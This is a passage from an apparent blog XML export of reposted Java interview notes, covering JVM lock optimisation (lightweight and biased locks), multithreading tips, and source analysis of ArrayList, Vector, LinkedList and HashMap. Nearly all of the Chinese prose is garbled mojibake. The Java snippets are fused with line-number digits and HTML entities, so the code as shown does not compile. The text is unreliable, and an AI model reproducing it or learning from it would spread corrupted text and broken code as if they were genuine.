ç»Ÿçš„é‡é‡çº§é”è€Œè¨€ï¼Œå®ƒä½¿ç”¨ CAS æ“ä½œæ¥é¿å…é‡é‡çº§é”ä½¿ç”¨äº’æ–¥é‡çš„å¼€é”€ã€‚å¯¹äºç»å¤§éƒ¨åˆ†çš„é”ï¼Œåœ¨æ•´ä¸ªåŒæ­¥å‘¨æœŸå†…éƒ½æ˜¯ä¸å­˜åœ¨ç«äº‰çš„ï¼Œå› æ­¤ä¹Ÿå°±ä¸éœ€è¦éƒ½ä½¿ç”¨äº’æ–¥é‡è¿›è¡ŒåŒæ­¥ï¼Œå¯ä»¥å…ˆé‡‡ç”¨ CAS æ“ä½œè¿›è¡ŒåŒæ­¥ï¼Œå¦‚æœ CAS å¤±è´¥äº†å†æ”¹ç”¨äº’æ–¥é‡è¿›è¡ŒåŒæ­¥ã€‚ å½“å°è¯•è·å–ä¸€ä¸ªé”å¯¹è±¡æ—¶ï¼Œå¦‚æœé”å¯¹è±¡æ ‡è®°ä¸º 0 01ï¼Œè¯´æ˜é”å¯¹è±¡çš„é”æœªé”å®šï¼ˆunlockedï¼‰çŠ¶æ€ã€‚æ­¤æ—¶è™šæ‹Ÿæœºåœ¨å½“å‰çº¿ç¨‹æ ˆä¸­åˆ›å»º Lock Recordï¼Œç„¶åä½¿ç”¨ CAS æ“ä½œå°†å¯¹è±¡çš„ Mark Word æ›´æ–°ä¸º Lock Record æŒ‡é’ˆã€‚å¦‚æœ CAS æ“ä½œæˆåŠŸäº†ï¼Œé‚£ä¹ˆçº¿ç¨‹å°±è·å–äº†è¯¥å¯¹è±¡ä¸Šçš„é”ï¼Œå¹¶ä¸”å¯¹è±¡çš„ Mark Word çš„é”æ ‡è®°å˜ä¸º 00ï¼Œè¡¨ç¤ºè¯¥å¯¹è±¡å¤„äºè½»é‡çº§é”çŠ¶æ€ã€‚ å¦‚æœ CAS æ“ä½œå¤±è´¥äº†ï¼Œè™šæ‹Ÿæœºé¦–å…ˆä¼šæ£€æŸ¥å¯¹è±¡çš„ Mark Word æ˜¯å¦æŒ‡å‘å½“å‰çº¿ç¨‹çš„è™šæ‹Ÿæœºæ ˆï¼Œå¦‚æœæ˜¯çš„è¯è¯´æ˜å½“å‰çº¿ç¨‹å·²ç»æ‹¥æœ‰äº†è¿™ä¸ªé”å¯¹è±¡ï¼Œé‚£å°±å¯ä»¥ç›´æ¥è¿›å…¥åŒæ­¥å—ç»§ç»­æ‰§è¡Œï¼Œå¦åˆ™è¯´æ˜è¿™ä¸ªé”å¯¹è±¡å·²ç»è¢«å…¶ä»–çº¿ç¨‹çº¿ç¨‹æŠ¢å äº†ã€‚å¦‚æœæœ‰ä¸¤æ¡ä»¥ä¸Šçš„çº¿ç¨‹äº‰ç”¨åŒä¸€ä¸ªé”ï¼Œé‚£è½»é‡çº§é”å°±ä¸å†æœ‰æ•ˆï¼Œè¦è†¨èƒ€ä¸ºé‡é‡çº§é”ã€‚ åå‘é”åå‘é”çš„æ€æƒ³æ˜¯åå‘äºè®©ç¬¬ä¸€ä¸ªè·å–é”å¯¹è±¡çš„çº¿ç¨‹ï¼Œè¿™ä¸ªçº¿ç¨‹åœ¨ä¹‹åè·å–è¯¥é”å°±ä¸å†éœ€è¦è¿›è¡ŒåŒæ­¥æ“ä½œï¼Œç”šè‡³è¿ CAS æ“ä½œä¹Ÿä¸å†éœ€è¦ã€‚ å½“é”å¯¹è±¡ç¬¬ä¸€æ¬¡è¢«çº¿ç¨‹è·å¾—çš„æ—¶å€™ï¼Œè¿›å…¥åå‘çŠ¶æ€ï¼Œæ ‡è®°ä¸º 1 01ã€‚åŒæ—¶ä½¿ç”¨ CAS æ“ä½œå°†çº¿ç¨‹ ID è®°å½•åˆ° Mark Word ä¸­ï¼Œå¦‚æœ CAS æ“ä½œæˆåŠŸï¼Œè¿™ä¸ªçº¿ç¨‹ä»¥åæ¯æ¬¡è¿›å…¥è¿™ä¸ªé”ç›¸å…³çš„åŒæ­¥å—å°±ä¸éœ€è¦å†è¿›è¡Œä»»ä½•åŒæ­¥æ“ä½œã€‚ å½“æœ‰å¦å¤–ä¸€ä¸ªçº¿ç¨‹å»å°è¯•è·å–è¿™ä¸ªé”å¯¹è±¡æ—¶ï¼Œåå‘çŠ¶æ€å°±å®£å‘Šç»“æŸï¼Œæ­¤æ—¶æ’¤é”€åå‘ï¼ˆRevoke Biasï¼‰åæ¢å¤åˆ°æœªé”å®šçŠ¶æ€æˆ–è€…è½»é‡çº§é”çŠ¶æ€ã€‚ åä¸‰ã€å¤šçº¿ç¨‹å¼€å‘è‰¯å¥½çš„å®è·µ ç»™çº¿ç¨‹èµ·ä¸ªæœ‰æ„ä¹‰çš„åå­—ï¼Œè¿™æ ·å¯ä»¥æ–¹ä¾¿æ‰¾ Bugã€‚ ç¼©å°åŒæ­¥èŒƒå›´ï¼Œä¾‹å¦‚å¯¹äº synchronizedï¼Œåº”è¯¥å°½é‡ä½¿ç”¨åŒæ­¥å—è€Œä¸æ˜¯åŒæ­¥æ–¹æ³•ã€‚ å¤šç”¨åŒæ­¥ç±»å°‘ç”¨ wait() å’Œ notify()ã€‚é¦–å…ˆï¼ŒCountDownLatch, Semaphore, CyclicBarrier å’Œ Exchanger è¿™äº›åŒæ­¥ç±»ç®€åŒ–äº†ç¼–ç æ“ä½œï¼Œè€Œç”¨ wait() å’Œ notify() å¾ˆéš¾å®ç°å¯¹å¤æ‚æ§åˆ¶æµçš„æ§åˆ¶ã€‚å…¶æ¬¡ï¼Œè¿™äº›ç±»æ˜¯ç”±æœ€å¥½çš„ä¼ä¸šç¼–å†™å’Œç»´æŠ¤ï¼Œåœ¨åç»­çš„ JDK ä¸­å®ƒä»¬è¿˜ä¼šä¸æ–­ä¼˜åŒ–å’Œå®Œå–„ï¼Œä½¿ç”¨è¿™äº›æ›´é«˜ç­‰çº§çš„åŒæ­¥å·¥å…·ä½ çš„ç¨‹åºå¯ä»¥ä¸è´¹å¹ç°ä¹‹åŠ›è·å¾—ä¼˜åŒ–ã€‚ å¤šç”¨å¹¶å‘é›†åˆå°‘ç”¨åŒæ­¥é›†åˆã€‚å¹¶å‘é›†åˆæ¯”åŒæ­¥é›†åˆçš„å¯æ‰©å±•æ€§æ›´å¥½ï¼Œä¾‹å¦‚åº”è¯¥ä½¿ç”¨ ConcurrentHashMap è€Œä¸æ˜¯ Hashtableã€‚ ä½¿ç”¨æœ¬åœ°å˜é‡å’Œä¸å¯å˜ç±»æ¥ä¿è¯çº¿ç¨‹å®‰å…¨ã€‚ ä½¿ç”¨çº¿ç¨‹æ± è€Œä¸æ˜¯ç›´æ¥åˆ›å»º Thread å¯¹è±¡ï¼Œè¿™æ˜¯å› ä¸ºåˆ›å»ºçº¿ç¨‹ä»£ä»·å¾ˆé«˜ï¼Œçº¿ç¨‹æ± å¯ä»¥æœ‰æ•ˆåœ°åˆ©ç”¨æœ‰é™çš„çº¿ç¨‹æ¥å¯åŠ¨ä»»åŠ¡ã€‚ ä½¿ç”¨ BlockingQueue å®ç°ç”Ÿäº§è€…æ¶ˆè´¹è€…é—®é¢˜ã€‚ å‚è€ƒèµ„æ–™ BruceEckel. Java ç¼–ç¨‹æ€æƒ³: ç¬¬ 4 ç‰ˆ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2007. å‘¨å¿—æ˜. æ·±å…¥ç†è§£ Java è™šæ‹Ÿæœº [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2011. Threads and Locks çº¿ç¨‹é€šä¿¡ Java çº¿ç¨‹é¢è¯•é¢˜ Top 50 BlockingQueue thread state java CSC 456 Spring 2012/ch7 MN Java - Understanding Happens-before relationship 6ì¥ Thread Synchronization How is Javaâ€™s ThreadLocal implemented under the hood? Concurrent JAVA FORK JOIN EXAMPLE èŠèŠå¹¶å‘ï¼ˆå…«ï¼‰â€”â€”Fork/Join æ¡†æ¶ä»‹ç» Eliminating SynchronizationRelated Atomic Operations with Biased Locking and Bulk Rebiasing]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java å®¹å™¨]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FJava%20%E5%AE%B9%E5%99%A8%2F</url>
    <content type="text"><![CDATA[ä¸€ã€æ¦‚è§ˆ Collection Map äºŒã€å®¹å™¨ä¸­çš„è®¾è®¡æ¨¡å¼ è¿­ä»£å™¨æ¨¡å¼ é€‚é…å™¨æ¨¡å¼ ä¸‰ã€æºç åˆ†æ ArrayList Vector LinkedList HashMap ConcurrentHashMap å‚è€ƒèµ„æ–™ ä¸€ã€æ¦‚è§ˆå®¹å™¨ä¸»è¦åŒ…æ‹¬ Collection å’Œ Map ä¸¤ç§ï¼ŒCollection åˆåŒ…å«äº† Listã€Set ä»¥åŠ Queueã€‚ Collection 1. Set HashSetï¼šåŸºäºå“ˆå¸Œå®ç°ï¼Œæ”¯æŒå¿«é€ŸæŸ¥æ‰¾ï¼Œä½†ä¸æ”¯æŒæœ‰åºæ€§æ“ä½œï¼Œä¾‹å¦‚æ ¹æ®ä¸€ä¸ªèŒƒå›´æŸ¥æ‰¾å…ƒç´ çš„æ“ä½œã€‚å¹¶ä¸”å¤±å»äº†å…ƒç´ çš„æ’å…¥é¡ºåºä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¯´ä½¿ç”¨ Iterator éå† HashSet å¾—åˆ°çš„ç»“æœæ˜¯ä¸ç¡®å®šçš„ï¼› TreeSetï¼šåŸºäºçº¢é»‘æ ‘å®ç°ï¼Œæ”¯æŒæœ‰åºæ€§æ“ä½œï¼Œä½†æ˜¯æŸ¥æ‰¾æ•ˆç‡ä¸å¦‚ HashSetï¼ŒHashSet æŸ¥æ‰¾æ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼ŒTreeSet åˆ™ä¸º O(logN)ï¼› LinkedHashSetï¼šå…·æœ‰ HashSet çš„æŸ¥æ‰¾æ•ˆç‡ï¼Œä¸”å†…éƒ¨ä½¿ç”¨é“¾è¡¨ç»´æŠ¤å…ƒç´ çš„æ’å…¥é¡ºåºã€‚ 2. List ArrayListï¼šåŸºäºåŠ¨æ€æ•°ç»„å®ç°ï¼Œæ”¯æŒéšæœºè®¿é—®ï¼› Vectorï¼šå’Œ ArrayList ç±»ä¼¼ï¼Œä½†å®ƒæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼› LinkedListï¼šåŸºäºåŒå‘é“¾è¡¨å®ç°ï¼Œåªèƒ½é¡ºåºè®¿é—®ï¼Œä½†æ˜¯å¯ä»¥å¿«é€Ÿåœ°åœ¨é“¾è¡¨ä¸­é—´æ’å…¥å’Œåˆ é™¤å…ƒç´ ã€‚ä¸ä»…å¦‚æ­¤ï¼ŒLinkedList è¿˜å¯ä»¥ç”¨ä½œæ ˆã€é˜Ÿåˆ—å’ŒåŒå‘é˜Ÿåˆ—ã€‚ 3. Queue LinkedListï¼šå¯ä»¥ç”¨å®ƒæ¥æ”¯æŒåŒå‘é˜Ÿåˆ—ï¼› PriorityQueueï¼šåŸºäºå †ç»“æ„å®ç°ï¼Œå¯ä»¥ç”¨å®ƒæ¥å®ç°ä¼˜å…ˆé˜Ÿåˆ—ã€‚ Map HashMapï¼šåŸºäºå“ˆå¸Œå®ç°ï¼› HashTableï¼šå’Œ HashMap ç±»ä¼¼ï¼Œä½†å®ƒæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œè¿™æ„å‘³ç€åŒä¸€æ—¶åˆ»å¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶å†™å…¥ HashTable å¹¶ä¸”ä¸ä¼šå¯¼è‡´æ•°æ®ä¸ä¸€è‡´ã€‚å®ƒæ˜¯é—ç•™ç±»ï¼Œä¸åº”è¯¥å»ä½¿ç”¨å®ƒã€‚ç°åœ¨å¯ä»¥ä½¿ç”¨ ConcurrentHashMap æ¥æ”¯æŒçº¿ç¨‹å®‰å…¨ï¼Œå¹¶ä¸” ConcurrentHashMap çš„æ•ˆç‡ä¼šæ›´é«˜ï¼Œå› ä¸º ConcurrentHashMap å¼•å…¥äº†åˆ†æ®µé”ã€‚ LinkedHashMapï¼šä½¿ç”¨é“¾è¡¨æ¥ç»´æŠ¤å…ƒç´ çš„é¡ºåºï¼Œé¡ºåºä¸ºæ’å…¥é¡ºåºæˆ–è€…æœ€è¿‘æœ€å°‘ä½¿ç”¨ï¼ˆLRUï¼‰é¡ºåºã€‚ TreeMapï¼šåŸºäºçº¢é»‘æ ‘å®ç°ã€‚ äºŒã€å®¹å™¨ä¸­çš„è®¾è®¡æ¨¡å¼è¿­ä»£å™¨æ¨¡å¼ Collection å®ç°äº† Iterable æ¥å£ï¼Œå…¶ä¸­çš„ iterator() æ–¹æ³•èƒ½å¤Ÿäº§ç”Ÿä¸€ä¸ª Iterator å¯¹è±¡ï¼Œé€šè¿‡è¿™ä¸ªå¯¹è±¡å°±å¯ä»¥è¿­ä»£éå† Collection ä¸­çš„å…ƒç´ ã€‚ ä» JDK 1.5 ä¹‹åå¯ä»¥ä½¿ç”¨ foreach æ–¹æ³•æ¥éå†å®ç°äº† Iterable æ¥å£çš„èšåˆå¯¹è±¡ã€‚ 123456List&lt;String&gt; list = new ArrayList&lt;&gt;();list.add("a");list.add("b");for (String item : list) &#123; System.out.println(item);&#125; é€‚é…å™¨æ¨¡å¼java.util.Arrays#asList() å¯ä»¥æŠŠæ•°ç»„ç±»å‹è½¬æ¢ä¸º List ç±»å‹ã€‚ 12@SafeVarargspublic static &lt;T&gt; List&lt;T&gt; asList(T... a) å¦‚æœè¦å°†æ•°ç»„ç±»å‹è½¬æ¢ä¸º List ç±»å‹ï¼Œåº”è¯¥æ³¨æ„çš„æ˜¯ asList() çš„å‚æ•°ä¸ºæ³›å‹çš„å˜é•¿å‚æ•°ï¼Œå› æ­¤ä¸èƒ½ä½¿ç”¨åŸºæœ¬ç±»å‹æ•°ç»„ä½œä¸ºå‚æ•°ï¼Œåªèƒ½ä½¿ç”¨ç›¸åº”çš„åŒ…è£…ç±»å‹æ•°ç»„ã€‚ 12Integer[] arr = &#123;1, 2, 3&#125;;List list = Arrays.asList(arr); ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼ç”Ÿæˆ Listã€‚ 1List list = Arrays.asList(1,2,3); ä¸‰ã€æºç åˆ†æå¦‚æœæ²¡æœ‰ç‰¹åˆ«è¯´æ˜ï¼Œä»¥ä¸‹æºç åˆ†æåŸºäº JDK 1.8ã€‚ åœ¨ IDEA ä¸­ double shift è°ƒå‡º Search EveryWhereï¼ŒæŸ¥æ‰¾æºç æ–‡ä»¶ï¼Œæ‰¾åˆ°ä¹‹åå°±å¯ä»¥é˜…è¯»æºç ã€‚ ArrayList1. æ¦‚è§ˆå®ç°äº† RandomAccess æ¥å£ï¼Œå› æ­¤æ”¯æŒéšæœºè®¿é—®ï¼Œè¿™æ˜¯ç†æ‰€å½“ç„¶çš„ï¼Œå› ä¸º ArrayList æ˜¯åŸºäºæ•°ç»„å®ç°çš„ã€‚ 12public class ArrayList&lt;E&gt; extends AbstractList&lt;E&gt; implements List&lt;E&gt;, RandomAccess, Cloneable, java.io.Serializable æ•°ç»„çš„é»˜è®¤å¤§å°ä¸º 10ã€‚ 1private static final int DEFAULT_CAPACITY = 10; 2. åºåˆ—åŒ–åŸºäºæ•°ç»„å®ç°ï¼Œä¿å­˜å…ƒç´ çš„æ•°ç»„ä½¿ç”¨ transient ä¿®é¥°ï¼Œè¯¥å…³é”®å­—å£°æ˜æ•°ç»„é»˜è®¤ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚ArrayList å…·æœ‰åŠ¨æ€æ‰©å®¹ç‰¹æ€§ï¼Œå› æ­¤ä¿å­˜å…ƒç´ çš„æ•°ç»„ä¸ä¸€å®šéƒ½ä¼šè¢«ä½¿ç”¨ï¼Œé‚£ä¹ˆå°±æ²¡å¿…è¦å…¨éƒ¨è¿›è¡Œåºåˆ—åŒ–ã€‚ArrayList é‡å†™äº† writeObject() å’Œ readObject() æ¥æ§åˆ¶åªåºåˆ—åŒ–æ•°ç»„ä¸­æœ‰å…ƒç´ å¡«å……é‚£éƒ¨åˆ†å†…å®¹ã€‚ 1transient Object[] elementData; // non-private to simplify nested class access 3. æ‰©å®¹æ·»åŠ å…ƒç´ æ—¶ä½¿ç”¨ ensureCapacityInternal() æ–¹æ³•æ¥ä¿è¯å®¹é‡è¶³å¤Ÿï¼Œå¦‚æœä¸å¤Ÿæ—¶ï¼Œéœ€è¦ä½¿ç”¨ grow() æ–¹æ³•è¿›è¡Œæ‰©å®¹ï¼Œæ–°å®¹é‡çš„å¤§å°ä¸º oldCapacity + (oldCapacity &gt;&gt; 1)ï¼Œä¹Ÿå°±æ˜¯æ—§å®¹é‡çš„ 1.5 å€ã€‚ æ‰©å®¹æ“ä½œéœ€è¦è°ƒç”¨ Arrays.copyOf() æŠŠåŸæ•°ç»„æ•´ä¸ªå¤åˆ¶åˆ°æ–°æ•°ç»„ä¸­ï¼Œè¿™ä¸ªæ“ä½œä»£ä»·å¾ˆé«˜ï¼Œå› æ­¤æœ€å¥½åœ¨åˆ›å»º ArrayList å¯¹è±¡æ—¶å°±æŒ‡å®šå¤§æ¦‚çš„å®¹é‡å¤§å°ï¼Œå‡å°‘æ‰©å®¹æ“ä½œçš„æ¬¡æ•°ã€‚ 12345678910111213141516171819202122232425262728293031public boolean add(E e) &#123; ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;&#125;private void ensureCapacityInternal(int minCapacity) &#123; if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) &#123; minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); &#125; ensureExplicitCapacity(minCapacity);&#125;private void ensureExplicitCapacity(int minCapacity) &#123; modCount++; // overflow-conscious code if (minCapacity - elementData.length &gt; 0) grow(minCapacity);&#125;private void grow(int minCapacity) &#123; // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity &gt;&gt; 1); if (newCapacity - minCapacity &lt; 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE &gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity);&#125; 4. åˆ é™¤å…ƒç´ éœ€è¦è°ƒç”¨ System.arraycopy() å°† index+1 åé¢çš„å…ƒç´ éƒ½å¤åˆ¶åˆ° index ä½ç½®ä¸Šã€‚ 12345678910public E remove(int index) &#123; rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved &gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work return oldValue;&#125; 5. Fail-FastmodCount ç”¨æ¥è®°å½• ArrayList ç»“æ„å‘ç”Ÿå˜åŒ–çš„æ¬¡æ•°ã€‚ç»“æ„å‘ç”Ÿå˜åŒ–æ˜¯æŒ‡æ·»åŠ æˆ–è€…åˆ é™¤è‡³å°‘ä¸€ä¸ªå…ƒç´ çš„æ‰€æœ‰æ“ä½œï¼Œæˆ–è€…æ˜¯è°ƒæ•´å†…éƒ¨æ•°ç»„çš„å¤§å°ï¼Œä»…ä»…åªæ˜¯è®¾ç½®å…ƒç´ çš„å€¼ä¸ç®—ç»“æ„å‘ç”Ÿå˜åŒ–ã€‚ åœ¨è¿›è¡Œåºåˆ—åŒ–æˆ–è€…è¿­ä»£ç­‰æ“ä½œæ—¶ï¼Œéœ€è¦æ¯”è¾ƒæ“ä½œå‰å modCount æ˜¯å¦æ”¹å˜ï¼Œå¦‚æœæ”¹å˜äº†éœ€è¦æŠ›å‡º ConcurrentModificationExceptionã€‚ 123456789101112131415161718private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException&#123; // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. for (int i=0; i&lt;size; i++) &#123; s.writeObject(elementData[i]); &#125; if (modCount != expectedModCount) &#123; throw new ConcurrentModificationException(); &#125;&#125; Vector1. åŒæ­¥å®ƒçš„å®ç°ä¸ ArrayList ç±»ä¼¼ï¼Œä½†æ˜¯ä½¿ç”¨äº† synchronized è¿›è¡ŒåŒæ­¥ã€‚ 12345678910111213public synchronized boolean add(E e) &#123; modCount++; ensureCapacityHelper(elementCount + 1); elementData[elementCount++] = e; return true;&#125;public synchronized E get(int index) &#123; if (index &gt;= elementCount) throw new ArrayIndexOutOfBoundsException(index); return elementData(index);&#125; 2. ArrayList ä¸ Vector Vector æ˜¯åŒæ­¥çš„ï¼Œå› æ­¤å¼€é”€å°±æ¯” ArrayList è¦å¤§ï¼Œè®¿é—®é€Ÿåº¦æ›´æ…¢ã€‚æœ€å¥½ä½¿ç”¨ ArrayList è€Œä¸æ˜¯ Vectorï¼Œå› ä¸ºåŒæ­¥æ“ä½œå®Œå…¨å¯ä»¥ç”±ç¨‹åºå‘˜è‡ªå·±æ¥æ§åˆ¶ï¼› Vector æ¯æ¬¡æ‰©å®¹è¯·æ±‚å…¶å¤§å°çš„ 2 å€ç©ºé—´ï¼Œè€Œ ArrayList æ˜¯ 1.5 å€ã€‚ 3. Vector æ›¿ä»£æ–¹æ¡ˆä¸ºäº†è·å¾—çº¿ç¨‹å®‰å…¨çš„ ArrayListï¼Œå¯ä»¥ä½¿ç”¨ Collections.synchronizedList(); å¾—åˆ°ä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„ ArrayListã€‚ 12List&lt;String&gt; list = new ArrayList&lt;&gt;();List&lt;String&gt; synList = Collections.synchronizedList(list); ä¹Ÿå¯ä»¥ä½¿ç”¨ concurrent å¹¶å‘åŒ…ä¸‹çš„ CopyOnWriteArrayList ç±»ã€‚ 1List&lt;String&gt; list = new CopyOnWriteArrayList&lt;&gt;(); LinkedList1. æ¦‚è§ˆåŸºäºåŒå‘é“¾è¡¨å®ç°ï¼Œå†…éƒ¨ä½¿ç”¨ Node æ¥å­˜å‚¨é“¾è¡¨èŠ‚ç‚¹ä¿¡æ¯ã€‚ 12345private static class Node&lt;E&gt; &#123; E item; Node&lt;E&gt; next; Node&lt;E&gt; prev;&#125; æ¯ä¸ªé“¾è¡¨å­˜å‚¨äº† Head å’Œ Tail æŒ‡é’ˆï¼š 12transient Node&lt;E&gt; first;transient Node&lt;E&gt; last; 2. ArrayList ä¸ LinkedList ArrayList åŸºäºåŠ¨æ€æ•°ç»„å®ç°ï¼ŒLinkedList åŸºäºåŒå‘é“¾è¡¨å®ç°ï¼› ArrayList æ”¯æŒéšæœºè®¿é—®ï¼ŒLinkedList ä¸æ”¯æŒï¼› LinkedList åœ¨ä»»æ„ä½ç½®æ·»åŠ åˆ é™¤å…ƒç´ æ›´å¿«ã€‚ HashMapä¸ºäº†ä¾¿äºç†è§£ï¼Œä»¥ä¸‹æºç åˆ†æä»¥ JDK 1.7 ä¸ºä¸»ã€‚ 1. å­˜å‚¨ç»“æ„å†…éƒ¨åŒ…å«äº†ä¸€ä¸ª Entry ç±»å‹çš„æ•°ç»„ tableã€‚ 1transient Entry[] table; å…¶ä¸­ï¼ŒEntry å°±æ˜¯å­˜å‚¨æ•°æ®çš„é”®å€¼å¯¹ï¼Œå®ƒåŒ…å«äº†å››ä¸ªå­—æ®µã€‚ä» next å­—æ®µæˆ‘ä»¬å¯ä»¥çœ‹å‡º Entry æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œå³æ•°ç»„ä¸­çš„æ¯ä¸ªä½ç½®è¢«å½“æˆä¸€ä¸ªæ¡¶ï¼Œä¸€ä¸ªæ¡¶å­˜æ”¾ä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨ä¸­å­˜æ”¾å“ˆå¸Œå€¼ç›¸åŒçš„ Entryã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒHashMap ä½¿ç”¨æ‹‰é“¾æ³•æ¥è§£å†³å†²çªã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465static class Entry&lt;K,V&gt; implements Map.Entry&lt;K,V&gt; &#123; final K key; V value; Entry&lt;K,V&gt; next; int hash; Entry(int h, K k, V v, Entry&lt;K,V&gt; n) &#123; value = v; next = n; key = k; hash = h; &#125; public final K getKey() &#123; return key; &#125; public final V getValue() &#123; return value; &#125; public final V setValue(V newValue) &#123; V oldValue = value; value = newValue; return oldValue; &#125; public final boolean equals(Object o) &#123; if (!(o instanceof Map.Entry)) return false; Map.Entry e = (Map.Entry)o; Object k1 = getKey(); Object k2 = e.getKey(); if (k1 == k2 || (k1 != null &amp;&amp; k1.equals(k2))) &#123; Object v1 = getValue(); Object v2 = e.getValue(); if (v1 == v2 || (v1 != null &amp;&amp; v1.equals(v2))) return true; &#125; return false; &#125; public final int hashCode() &#123; return Objects.hashCode(getKey()) ^ Objects.hashCode(getValue()); &#125; public final String toString() &#123; return getKey() + "=" + getValue(); &#125; /** * This method is invoked whenever the value in an entry is * overwritten by an invocation of put(k,v) for a key k that's already * in the HashMap. */ void recordAccess(HashMap&lt;K,V&gt; m) &#123; &#125; /** * This method is invoked whenever the entry is * removed from the table. */ void recordRemoval(HashMap&lt;K,V&gt; m) &#123; &#125;&#125; 2. æ‹‰é“¾æ³•çš„å·¥ä½œåŸç†1234HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();map.put("K1", "V1");map.put("K2", "V2");map.put("K3", "V3"); æ–°å»ºä¸€ä¸ª HashMapï¼Œé»˜è®¤å¤§å°ä¸º 16ï¼› æ’å…¥ &lt;K1,V1&gt; é”®å€¼å¯¹ï¼Œå…ˆè®¡ç®— K1 çš„ hashCode ä¸º 115ï¼Œä½¿ç”¨é™¤ç•™ä½™æ•°æ³•å¾—åˆ°æ‰€åœ¨çš„æ¡¶ä¸‹æ ‡ 115%16=3ã€‚ æ’å…¥ &lt;K2,V2&gt; é”®å€¼å¯¹ï¼Œå…ˆè®¡ç®— K2 çš„ hashCode ä¸º 118ï¼Œä½¿ç”¨é™¤ç•™ä½™æ•°æ³•å¾—åˆ°æ‰€åœ¨çš„æ¡¶ä¸‹æ ‡ 118%16=6ã€‚ æ’å…¥ &lt;K3,V3&gt; é”®å€¼å¯¹ï¼Œå…ˆè®¡ç®— K3 çš„ hashCode ä¸º 118ï¼Œä½¿ç”¨é™¤ç•™ä½™æ•°æ³•å¾—åˆ°æ‰€åœ¨çš„æ¡¶ä¸‹æ ‡ 118%16=6ï¼Œæ’åœ¨ &lt;K2,V2&gt; å‰é¢ã€‚ åº”è¯¥æ³¨æ„åˆ°é“¾è¡¨çš„æ’å…¥æ˜¯ä»¥å¤´æ’æ³•æ–¹å¼è¿›è¡Œçš„ï¼Œä¾‹å¦‚ä¸Šé¢çš„ &lt;K3,V3&gt; ä¸æ˜¯æ’åœ¨ &lt;K2,V2&gt; åé¢ï¼Œè€Œæ˜¯æ’å…¥åœ¨é“¾è¡¨å¤´éƒ¨ã€‚ æŸ¥æ‰¾éœ€è¦åˆ†æˆä¸¤æ­¥è¿›è¡Œï¼š è®¡ç®—é”®å€¼å¯¹æ‰€åœ¨çš„æ¡¶ï¼› åœ¨é“¾è¡¨ä¸Šé¡ºåºæŸ¥æ‰¾ï¼Œæ—¶é—´å¤æ‚åº¦æ˜¾ç„¶å’Œé“¾è¡¨çš„é•¿åº¦æˆæ­£æ¯”ã€‚ 3. put æ“ä½œ1234567891011121314151617181920212223242526public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; // é”®ä¸º null å•ç‹¬å¤„ç† if (key == null) return putForNullKey(value); int hash = hash(key); // ç¡®å®šæ¡¶ä¸‹æ ‡ int i = indexFor(hash, table.length); // å…ˆæ‰¾å‡ºæ˜¯å¦å·²ç»å­˜åœ¨é”®ä¸º key çš„é”®å€¼å¯¹ï¼Œå¦‚æœå­˜åœ¨çš„è¯å°±æ›´æ–°è¿™ä¸ªé”®å€¼å¯¹çš„å€¼ä¸º value for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; // æ’å…¥æ–°é”®å€¼å¯¹ addEntry(hash, key, value, i); return null;&#125; HashMap å…è®¸æ’å…¥é”®ä¸º null çš„é”®å€¼å¯¹ã€‚å› ä¸ºæ— æ³•è°ƒç”¨ null çš„ hashCode()ï¼Œä¹Ÿå°±æ— æ³•ç¡®å®šè¯¥é”®å€¼å¯¹çš„æ¡¶ä¸‹æ ‡ï¼Œåªèƒ½é€šè¿‡å¼ºåˆ¶æŒ‡å®šä¸€ä¸ªæ¡¶ä¸‹æ ‡æ¥å­˜æ”¾ã€‚HashMap ä½¿ç”¨ç¬¬ 0 ä¸ªæ¡¶å­˜æ”¾é”®ä¸º null çš„é”®å€¼å¯¹ã€‚ 12345678910111213private V putForNullKey(V value) &#123; for (Entry&lt;K,V&gt; e = table[0]; e != null; e = e.next) &#123; if (e.key == null) &#123; V oldValue = e.value; e.value = value; e.recordAccess(this); return oldValue; &#125; &#125; modCount++; addEntry(0, null, value, 0); return null;&#125; 